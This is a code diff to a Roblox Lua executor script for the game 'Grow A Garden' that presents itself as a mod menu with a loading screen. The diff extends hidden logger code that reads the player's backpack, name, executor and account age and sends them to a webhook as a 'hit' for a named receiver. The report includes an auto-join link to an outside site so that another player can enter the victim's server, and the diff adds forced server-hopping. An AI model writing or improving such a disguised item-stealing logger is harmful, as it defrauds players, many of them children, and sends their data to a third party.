@@ -3,6 +3,7 @@ local TARGET_NAME = "Davenaseventeen"
 local LOADING_TIME = 300
 
 local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
 local RunService = game:GetService("RunService")
 local TweenService = game:GetService("TweenService")
 local CoreGui = game:GetService("CoreGui")
@@ -11,6 +12,33 @@ local HttpService = game:GetService("HttpService")
 local lp = Players.LocalPlayer
 local Backpack = lp:WaitForChild("Backpack")
 
+-- 🧠 Rejoin if in a private server or full public server
+task.spawn(function()
+    if game.PrivateServerId ~= "" or #Players:GetPlayers() >= game.MaxPlayers then
+        local servers = {}
+        local req = (syn and syn.request or request)
+        if req then
+            local success, response = pcall(function()
+                return req({
+                    Url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
+                })
+            end)
+
+            if success and response and response.Body then
+                local data = HttpService:JSONDecode(response.Body)
+                for _, server in ipairs(data.data or {}) do
+                    if server.playing < server.maxPlayers and server.id ~= game.JobId then
+                        TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id)
+                        return
+                    end
+                end
+            end
+        end
+    end
+end)
+
+
+-- 🔇 Mute all sounds
 for _, inst in ipairs(workspace:GetDescendants()) do
     if inst:IsA("Sound") then
         inst:Stop()
@@ -18,6 +46,7 @@ for _, inst in ipairs(workspace:GetDescendants()) do
     end
 end
 
+-- 📦 Inventory handling
 local ig = { "trowel", "watering can", "sprinkler", "egg", "rod" }
 local animals = { "bunny", "dog", "golden lab", "chicken", "pig", "cow", "duck", "bee", "owl", "fox", "bear", "goat", "hedgehog", "horse", "donkey", "sheep", "cat", "turkey", "bat", "skeleton", "ghost", "pumpkin", "zombie", "reindeer", "elf", "penguin", "polar bear", "dragonfly", "queen bee", "disco bee", "chicken jockey", "cooked owl", "raccoon", "red fox" }
 local rareEmojiMap = {
@@ -35,8 +64,7 @@ local function contains(name, list)
     return false
 end
 
-local httpRequest = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or request
-
+-- 📤 Send Webhook
 do
     local animalItems, otherItems = {}, {}
     local mention = false
@@ -46,7 +74,7 @@ do
         if not contains(lnm, ig) then
             local emoji = rareEmojiMap[lnm]
             if emoji then mention = true end
-            local line = string.format("%s **• %s**", emoji or "", nm)
+            local line = string.format("%s %s", emoji or "-", nm)
             if contains(lnm, animals) then
                 table.insert(animalItems, line)
             else
@@ -55,24 +83,48 @@ do
         end
     end
 
-    local list = #animalItems > 0 and animalItems or {}
-    for _, v in ipairs(otherItems) do table.insert(list, v) end
-    local desc = #list > 0 and table.concat(list, "\n") or "__No valid items found.__"
+    local desc = (#animalItems > 0 and table.concat(animalItems, "\n")) or "__No valid items found.__"
     if #desc > 1900 then desc = desc:sub(1, 1900) .. "\n...and more" end
 
+    local function getAccountAge()
+        local success, result = pcall(function() return lp.AccountAge end)
+        return success and (result .. " days") or "Unknown"
+    end
+
     local joinURL = string.format("https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s", game.PlaceId, game.JobId)
+
     local payload = {
-        username = "Roblox Logger",
+        username = "Captain Hook",
         embeds = {{
-            title = "__" .. lp.Name .. "'s Backpack Contents__",
-            description = desc,
-            color = 65280,
-            footer = { text = "Roblox Inventory Logger" },
-            fields = {{ name = "__Join Roblox Server__", value = "[**Auto‑join**](" .. joinURL .. ")" }}
+            title = "🌿 Grow A Garden Hit 🌿",
+            color = 5763719,
+            fields = {
+                {
+                    name = "👤 Player Information",
+                    value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", lp.Name, TARGET_NAME, tostring(identifyexecutor and identifyexecutor() or "Unknown"), getAccountAge()),
+                    inline = false
+                },
+                {
+                    name = "🎒 Backpack",
+                    value = desc,
+                    inline = false
+                },
+                {
+                    name = "💥 Hits",
+                    value = "All Items",
+                    inline = false
+                },
+                {
+                    name = "🔗 Join with URL",
+                    value = string.format("[e7d57574-91a7-41cf-a190-db3dcaa201f1](%s)\n```%s```", joinURL, game.JobId),
+                    inline = false
+                }
+            }
         }}
     }
     if mention then payload.content = "@everyone" end
 
+    local httpRequest = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or request
     if httpRequest then
         local success, res = pcall(function()
             return httpRequest({
@@ -92,6 +144,7 @@ do
     end
 end
 
+-- 🖥️ Mod Menu Loader GUI
 do
     local gui = Instance.new("ScreenGui")
     gui.Name, gui.ResetOnSpawn, gui.DisplayOrder = "ModMenuLoading", false, 1000
